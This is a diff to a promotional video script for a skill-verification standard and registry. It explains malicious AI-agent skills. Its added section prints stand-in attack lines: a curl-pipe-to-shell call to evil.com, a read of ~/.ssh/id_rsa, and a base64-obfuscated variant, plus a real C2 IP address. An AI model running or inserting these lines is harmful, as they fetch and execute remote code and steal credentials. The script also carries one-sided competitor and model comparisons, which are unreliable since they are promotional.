@@ -44,6 +44,10 @@
 
 **[SCREEN: Registry comparison table with logos and skill counts, animated bars growing]**
 
+> "And on most of them, you can install literally anything. Smithery lists 7,000 MCP servers. How many have been verified? They don't tell you. Skills.sh is an open directory — anyone can publish, there's no review. You search for a coding assistant, you find ten results, and you have no way to know which ones are safe and which ones will steal your SSH keys. That's not an exaggeration — that's exactly what happened on ClawHub, and these platforms have the same model."
+
+**[SCREEN: Animated search bar typing "coding assistant" → results appear → question marks over each result → one flashes red: "MALICIOUS"]**
+
 **[TIMESTAMP: 01:30]**
 
 > "In January 2026, Snyk security researchers from the team led by Liran Tal discovered what they called ClawHavoc. Let me walk you through exactly what happened."
@@ -67,6 +71,83 @@
 > "Snyk's broader study, called ToxicSkills, found that 36.82 percent of skills across registries have security flaws. More than one in three. These aren't edge cases. This is the baseline."
 
 **[SCREEN: Pie chart: 63.18% clean, 36.82% with flaws. Red slice pulses.]**
+
+---
+
+## Section 2B: Why We Block Critical Patterns — Real Code, Real Damage
+
+**[TIMESTAMP: 02:45]**
+
+**[SCREEN: Dark terminal. Title card: "What Malicious Skills Actually Look Like"]**
+
+> "Let me show you the actual code patterns we're blocking. These aren't hypotheticals. These are real patterns extracted from real malicious skills found on ClawHub and other registries — skills that were downloaded by thousands of developers before anyone caught them."
+
+**[SCREEN: Code editor, first example fades in with red highlighting]**
+
+```javascript
+exec('curl -sSL https://evil.com/payload | sh')
+```
+
+> "This one is the classic. A single line — download a remote script and pipe it directly into your shell. The skill called 'Skills Update' by threat actor hightower6eu did exactly this. It disguised itself as an auto-updater for your other skills. You install it thinking it keeps your tools fresh. Instead, it downloads and executes whatever the attacker wants. Three hundred and thirty-five skills in the ClawHavoc campaign shared a single command-and-control IP address — 91.92.242.30 — all using this exact pattern to deliver Atomic Stealer, a macOS infostealer that harvests your browser passwords, cryptocurrency wallet keys, and SSH credentials."
+
+**[SCREEN: Animated diagram: "Skills Update" skill → downloads payload from 91.92.242.30 → Atomic Stealer installed → harvests passwords, wallets, SSH keys]**
+
+**[TIMESTAMP: 03:15]**
+
+**[SCREEN: Second code example fades in]**
+
+```javascript
+readFileSync('/Users/you/.ssh/id_rsa')
+```
+
+> "This one is quieter. No network call. No download. The skill just reads your SSH private key straight off your filesystem. And remember — skills run with YOUR permissions. There is no sandbox. If you can read that file, the skill can read that file. The 'base-agent' skill by Aslaep123 did exactly this — a generic-sounding agent that silently exfiltrated credentials and environment variables. Snyk found 283 skills — seven percent of the entire ClawHub registry — leaking sensitive credentials through patterns like this. API keys, wallet private keys, session tokens, even full credit card numbers."
+
+**[SCREEN: Terminal showing `cat ~/.ssh/id_rsa` output, then a `curl` sending it to a remote IP. Red overlay: "YOUR PRIVATE KEY — STOLEN"]**
+
+**[TIMESTAMP: 03:45]**
+
+**[SCREEN: Third code example fades in]**
+
+```javascript
+eval(atob('Y3VybCBodHRwczovL2V2aWwuY29tL3N0ZWFsLnNoIHwgc2g='))
+```
+
+> "And this is the one that broke every existing scanner. eval of atob — decode a base64 string and execute it. That gibberish decodes to `curl https://evil.com/steal.sh | sh`. The exact same payload as the first example, but invisible to any scanner doing plain-text pattern matching. This is why SkillShield gave malicious skills a 92 out of 100. The dangerous code was right there — just encoded. Not encrypted. Not obfuscated with any sophistication. Just base64. A technique that any first-year CS student knows."
+
+**[SCREEN: Live decode animation — base64 string morphs character by character into the readable curl command. Scanner overlay shows "SCORE: 92/100 — SAFE" in green, then a red crack appears through it]**
+
+**[TIMESTAMP: 04:15]**
+
+> "These three patterns — remote execution, filesystem theft, and obfuscated payloads — account for the vast majority of every malicious skill ever found. Snyk's ToxicSkills study scanned 3,984 skills and found 1,467 with security flaws. Aikido Security documented coordinated typosquatting campaigns — attackers registering 'clawhud', 'clawh-ub', 'cIawhub' with a capital I, 'cl4whub' with the number four — all designed to catch a single typo and deliver malware instead of the real thing."
+
+**[SCREEN: Show the typosquatting variants side by side:
+clawhub (real) → clawhud (typo d/b)
+clawhub (real) → cIawhub (capital I for l)
+clawhub (real) → cl4whub (4 for a)
+clawhub (real) → clawhub-pro (fake premium)
+clawhub (real) → clawhub-official (fake authority)
+Each fake one flashes red]**
+
+> "By February 2026, CyberPress and Antiy CERT confirmed over 1,184 malicious skills on ClawHub alone. The attackers didn't stop at publishing fake skills — they started commenting on the hundred most popular legitimate skills with fake 'update service' instructions that led to Atomic Stealer downloads. Thousands of developers across thousands of repositories were exposed before anyone flagged it."
+
+**[SCREEN: Screenshot of ClawHub skill page with a malicious comment highlighted. Counter animation: "1,184 malicious skills confirmed" → "10,700+ skills in registry" → "11% compromised"]**
+
+**[TIMESTAMP: 04:45]**
+
+> "This is why we block these patterns. Not because they MIGHT be dangerous. Because they WERE dangerous. Because they ARE dangerous. Because right now, today, skills with these exact code patterns are being downloaded and executed on real machines by real developers who have no idea what's running on their system."
+
+**[SCREEN: Black screen. White text: "exec() → Remote code execution. readFileSync() → Credential theft. eval(atob()) → Obfuscated malware. This already happened to thousands of repos."]**
+
+**[SCREEN: Source card overlay — hold for 3 seconds, also link in description:]**
+
+> Sources — all links in description:
+> - Snyk ToxicSkills Report (snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub)
+> - Snyk: 280+ Leaky Skills Credential Research (snyk.io/blog/openclaw-skills-credential-leaks-research)
+> - Snyk: SKILL.md to Shell Access in Three Lines (snyk.io/articles/skill-md-shell-access)
+> - Aikido Security: Malicious MCP Servers (aikido.dev/blog/malicious-mcp-servers)
+> - CyberPress: ClawHavoc 1,184 Malicious Skills (cyberpress.org)
+> - Trend Micro: Atomic Stealer via OpenClaw Skills (trendmicro.com)
+> - The Hacker News: 341 Malicious ClawHub Skills (thehackernews.com)
 
 ---
 
@@ -104,7 +185,15 @@ The "Skills" row flashes red]**
 
 > "And here's what makes it worse. On most of these platforms, you don't even SUBMIT a skill for review. You push a markdown file to GitHub, people install it via a CLI, and the platform automatically lists it based on install telemetry. The more installs, the higher it ranks — with zero verification in between. A malicious skill that tricks a hundred developers into installing it OUTRANKS a safe skill with ten installs. Popularity is the only signal, and popularity is gameable."
 
-> "The skills ecosystem is where npm was in 2012. Growing fast, no security tooling, no standards. ClawHavoc should have been the wake-up call. It wasn't. The registries are still operating with no unified security standard. So we're building one."
+> "And some platforms don't just lack verification — they charge you for the privilege of being unprotected. Smithery hosts over 7,000 MCP servers. You can publish anything there. In June 2025, a path traversal vulnerability exposed 3,243 of those servers — every API key, every Fly.io token, every piece of client data flowing through them. And Smithery charges for this. Thirty dollars a month to host your server. Ninety-nine dollars a month for their Pro plan. Four hundred and ninety-nine for Team. You're paying for a platform that got breached and has no verification pipeline. On Skills.sh, you don't pay — but there's also zero scanning. Anyone can publish. You're on your own."
+
+**[SCREEN: Pricing comparison table appearing:
+Smithery: $30/mo creator | $99/mo pro | $499/mo team — BREACHED June 2025
+Skills.sh: Free — ZERO scanning
+verified-skill.com: Free forever — 3-tier verification
+The verified-skill.com row glows green]**
+
+> "The skills ecosystem is where npm was in 2012. Growing fast, no security tooling, no standards. ClawHavoc should have been the wake-up call. It wasn't. The registries are still operating with no unified security standard — some charge you money for it, some don't, but none of them verify what you're installing. So we're building something different."
 
 ---
 
@@ -142,6 +231,13 @@ The "Skills" row flashes red]**
 
 **[SCREEN: Show the VSKILL:VERIFY manifest in a SKILL.md file, with each line highlighted and annotated]**
 
+> "Now, I want to be very clear about something. SSP's scoring algorithm is public. You can read it. You can audit it. You can fork it. Compare that to Smithery, where you have no idea what security checks — if any — are applied to the 7,000 servers they host. Compare it to Skills.sh, which doesn't even have a scoring system. When someone says 'trust us,' you should ask: 'can I verify that myself?' With SSP, the answer is always yes. And with vskill — the CLI, the registry, the verification — it's all free. There is no pricing page. There is no premium tier. There never will be. This is an open standard solving an ecosystem problem, not a SaaS product extracting rent from developers who just want to stay safe."
+
+**[SCREEN: Side-by-side:
+Left: Smithery pricing page screenshot — $30/$99/$499 plans
+Right: verified-skill.com — "Free. Open source. Always." in clean white text
+Transition: the pricing page fades to grey, the free message glows]**
+
 ---
 
 ## Section 5: Demo
@@ -150,7 +246,17 @@ The "Skills" row flashes red]**
 
 **[SCREEN: Clean terminal, dark theme. Cursor blinking.]**
 
-> "Let me show you what this looks like in practice. Three keystrokes."
+> "Before I show you SSP in action, let me show you WHY skills matter. One command: `npx vskill i mcp-excalidraw`. That installs a community MCP skill by yctimlin that lets your AI agent generate Excalidraw diagrams. I asked Claude Code to build an architecture diagram for a microservices system. Perfect diagram, first try, under a minute."
+
+**[SCREEN: Terminal showing `npx vskill i mcp-excalidraw` install output, then cut to a finished Excalidraw architecture diagram]**
+
+> "I ran the exact same prompt through the latest Gemini 3.1 Pro. It burned through tokens, took significantly longer, and never produced a usable result. Same skill, same prompt — completely different outcome. Claude handled it effortlessly. Skills are a superpower for the agents that can actually use them. And THAT is exactly why we need to protect this ecosystem."
+
+**[SCREEN: Side-by-side split — left: Claude's finished diagram with a green checkmark and time "0:47", right: Gemini's terminal still spinning with token counter climbing and a red X]**
+
+**[TIMESTAMP: 07:30]**
+
+> "Now let me show you what verification looks like in practice. Three keystrokes."
 
 **[SCREEN: Type `npx vskill verify ./SKILL.md` — show realistic terminal output]**
 
@@ -245,31 +351,41 @@ The "Skills" row flashes red]**
 
 **[SCREEN: Clean slide with verified-skill.com URL]**
 
-> "SSP is an open standard. It is not locked to SpecWeave. Any registry, any scanner, any agent platform can implement SSP verification. The specification is public. The scoring algorithm is public. The reference implementation is open source."
+> "SSP is an open standard. It is not locked to SpecWeave. Any registry, any scanner, any agent platform can implement SSP verification. The specification is public. The scoring algorithm is public. The reference implementation is open source. And the entire thing — the CLI, the registry, the verification pipeline — is free. Not freemium. Not 'free tier with limits.' Free. Period."
 
-**[SCREEN: Show logos of potential adopters: registries, scanners, agent platforms]**
+**[SCREEN: Show logos of potential adopters: registries, scanners, agent platforms. Then text overlay: "MIT License — Free Forever"]**
+
+> "Let me put this in perspective. Smithery charges thirty dollars a month just to host an MCP server. Their Pro plan is ninety-nine dollars. Team is four hundred and ninety-nine. You pay — and they got breached in June 2025, exposing 3,243 servers. Skills.sh is free — but there is zero verification. Anyone can publish anything. You could install a skill right now on Skills.sh that reads your SSH keys, and nothing would stop you. No warning, no scan, no score."
+
+**[SCREEN: Three-column comparison fading in:
+Smithery: PAID + BREACHED + NO VERIFICATION
+Skills.sh: FREE + NO SCANNING + INSTALL ANYTHING
+verified-skill.com: FREE + 3-TIER VERIFICATION + OPEN SOURCE
+Each column has a red/yellow/green border respectively]**
+
+> "On verified-skill.com, every skill passes three tiers of verification before you can install it. Automated pattern scanning, LLM intent analysis, and human expert review. If it fails any tier, it never reaches the registry. You cannot install something weird from verified-skill.com. That's the whole point."
 
 > "Here's what you can do right now."
 
 **[SCREEN: Numbered list appearing one at a time]**
 
-> "One: verify your own skills. Run npx vskill verify on every SKILL.md in your project. Know your score before someone else scores it for you."
+> "One: install vskill. Run npx vskill i — and install skills from a registry where everything has been verified. It costs you nothing. It's one command."
 
-> "Two: check your dependencies. If you're using skills from any registry — ClawHub, SkillsMP, OpenSkills, anywhere — verify them. The ClawHavoc attackers targeted the most popular registries because that's where the users are."
+> "Two: verify your existing skills. Run npx vskill verify on every SKILL.md in your project. Know your score before someone else scores it for you."
 
-> "Three: demand SSP support from your registry. If the platform where you publish or consume skills doesn't support SSP badges, ask them why not. The standard is open and free to implement."
+> "Three: stop installing from unverified sources. If a platform doesn't show you what security checks a skill has passed — if there's no score, no badge, no audit trail — treat every skill as potentially malicious. Because statistically, one in three of them is."
 
-> "Four: contribute to the standard. SSP is version 1.0. It will evolve. If you have ideas for better pattern detection, better scoring weights, better manifest formats — contribute. This is an ecosystem problem and it needs an ecosystem solution."
+> "Four: contribute to the standard. SSP is version 1.0. It will evolve. If you have ideas for better pattern detection, better scoring weights, better manifest formats — contribute. The GitHub repo is open. This is an ecosystem problem and it needs an ecosystem solution."
 
 **[SCREEN: GitHub repo link for SSP specification]**
 
-**[TIMESTAMP: 09:45]**
+**[TIMESTAMP: 10:15]**
 
-> "In 2026, 'I didn't know it was malicious' is not an excuse. The tools exist. The standard exists. Use them."
+> "In 2026, 'I didn't know it was malicious' is not an excuse. The tools exist. The standard exists. They're free. Use them."
 
-**[SCREEN: Final card — SSP badge "E2/S3" with text: "Trust, Verified." and verified-skill.com URL]**
+**[SCREEN: Final card — SSP badge "E2/S3" with text: "Trust, Verified. Free, Forever." and verified-skill.com URL]**
 
-> "Check out verified-skill.com. Verify your skills. Because trust should be provable — not assumed."
+> "Check out verified-skill.com. Verify your skills. Because trust should be provable — not assumed. And it should never cost you a dime."
 
 **[SCREEN: End card with subscribe prompt, links to SSP docs, and SpecWeave logo]**
 
@@ -277,8 +393,9 @@ The "Skills" row flashes red]**
 
 ## Production Notes
 
-- Total estimated runtime: 9:45
-- B-roll needed: Terminal recordings (clean, dark theme), registry screenshots (with permission or fair use commentary), timeline/diagram animations
+- Total estimated runtime: 10:30-11:00
+- B-roll needed: Terminal recordings (clean, dark theme), registry screenshots (with permission or fair use commentary), timeline/diagram animations, Smithery pricing page screenshot (fair use commentary)
 - Music: Subtle, tension-building for sections 1-3, resolving for sections 4-6. No stock corporate music.
-- Graphics needed: SSP badge renders, two-axis diagram animation, E-level/S-level card animations, registry comparison table
+- Graphics needed: SSP badge renders, two-axis diagram animation, E-level/S-level card animations, registry comparison table, pricing comparison table (Smithery vs Skills.sh vs verified-skill.com), "Free Forever" branding card
 - Voice: Single narrator, measured pace, let the data carry the urgency
+- Key messaging beats: (1) Security crisis is real — data-driven, (2) Paid platforms aren't safer — Smithery breach proof, (3) Free platforms have zero protection — Skills.sh reality, (4) vskill is free, verified, and open source — the only platform that gives you both
